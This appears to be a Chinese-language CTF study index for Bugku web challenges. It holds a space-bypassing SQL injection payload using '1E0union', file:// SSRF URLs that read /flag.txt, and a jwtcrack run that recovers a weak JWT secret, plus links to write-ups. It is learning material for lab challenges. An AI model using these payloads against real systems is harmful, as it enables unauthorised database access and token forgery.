1、[[ezbypass-cat]] ----白名单目录穿透
2、[[very_easy_sql]]  ----------[[ssrf]]利用gopher协议+sql注入的cookie盲注













#### 1、[https://ctf.bugku.com/challenges/detail/id/406.html](https://ctf.bugku.com/challenges/detail/id/406.html%E3%80%81)
题解：[[2、ctf-websqli-0x1-bugku题解]]
```sql
mysql> select * from test where id=-1e0union select 3,'huhu';
+------+------+
| id   | name |
+------+------+
|    3 | huhu |
+------+------+
1 row in set (0.00 sec)
```

注意：对于mysqli来说query方法可以执行insert
学到的东西：
```sql
#使用浮点数加union的方式绕过空格，使用order by查询第一行数据
select * from users where username=1E0'unoin select * from users order by username desc
select * from users where username=1E0'unoin insert

```
[[sql注入绕过]]
#### 2、baby lfi 2
https://ctf.bugku.com/challenges/detail/id/426.html
题解：[[1、baby lfi 2题解]]
#### 3、nextGen2
https://ctf.bugku.com/challenges/detail/id/431.html
```
//以下三个的效果是一样的
file:///flag.txt
file://127.0.0.1/flag.txt
file://127.0.1/flag.txt
```
#### 4、whois
https://ctf.bugku.com/challenges/detail/id/432.html
[[whois题解]]

#### 1、just-work-type
注意：这个token由三部分组成以.分割，前两个部分是由base64编码的（注意万能解密工具中的那个base64编码可能没法用，用小葵，然后，破解密码的工具在kali中）
破解密码工具使用方法如下：
```
┌──(root㉿kali)-[~/桌面/c-jwt-cracker-master]
└─# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOmZhbHNlLCJkYXRhIjp7InVzZXJuYW1lIjoiem9tYm8iLCJwYXNzd29yZCI6InpvbWJvIn19LCJpYXQiOjE3MDE2ODAxNDcsImV4cCI6MTcwMTY4Mzc0N30.d8DbLwxb3aqXtc2a8DsZOuAXFruBWbWYr8YaGF-ig5I
Secret is "123"
                             
```
[[json web token绕过思路]]

#### 1、ez_curl:
[[ez_curl题解]]
#### 2、unseping：
https://blog.csdn.net/weixin_62871152/article/details/127651737
[[unseping题解]]

